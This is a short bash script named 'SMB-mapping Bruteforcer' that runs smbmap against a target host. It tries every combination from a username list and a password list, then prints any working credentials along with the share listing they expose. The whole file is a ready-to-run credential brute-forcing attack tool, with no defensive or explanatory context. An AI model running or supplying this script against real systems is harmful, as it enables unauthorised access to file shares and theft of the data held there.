#!/bin/bash
rm -rf tmp
rm -rf op.txt
valid_cred () { echo " "; }
banner_som () { echo -e "\e[91m######################################################";
echo -e "\e[34m                 SMB-mapping Bruteforcer            ";
echo -e "                      Coded by \e[5mZyperX\e[0m               ";
echo -e "\e[91m######################################################" ;
echo -e "\e[0m";
 }
if [ $# -ne 3 ]
then
 banner_som
 echo -e "\e[35mSyntax:smb_map_brute.sh <hostname>  <file_with_usernames> <file_with_password> \e[0m"
elif [ ! hash smbmap 2>/dev/null ]
then
 echo "!!!!Install smbmap before starting!!!!!"
 o=$(pgrep username_smb.sh)
 kill $o
else
 for i in $(cat $2)
 do
  for j in $(cat $3)
  do
  banner_som
  valid_cred
  echo -e "\e[93m----------------------------------------------------------\e[0m"
  echo -e "Trying user \e[36m\e[41m"$i"\e[0m with password \e[36m\e[41m"$j"\e[0m"
  echo -e "\e[93m----------------------------------------------------------\e[0m"
  smbmap -H $1 -u $i -p $j  > op.txt
  check=$(wc -l op.txt | cut -d " " -f1)
  echo $check
  if [ $check -gt 6 ];
  then
   cat op.txt | grep -C 10000 "established" > tmp
   valid_cred () { echo -e " \e[91m Found user \e[36m\e[41m"$i"\e[0m with password \e[36m\e[41m"$j"\e[0m";cat tmp; };
  fi
  clear
  rm -rf op.txt
  done
 done
fi

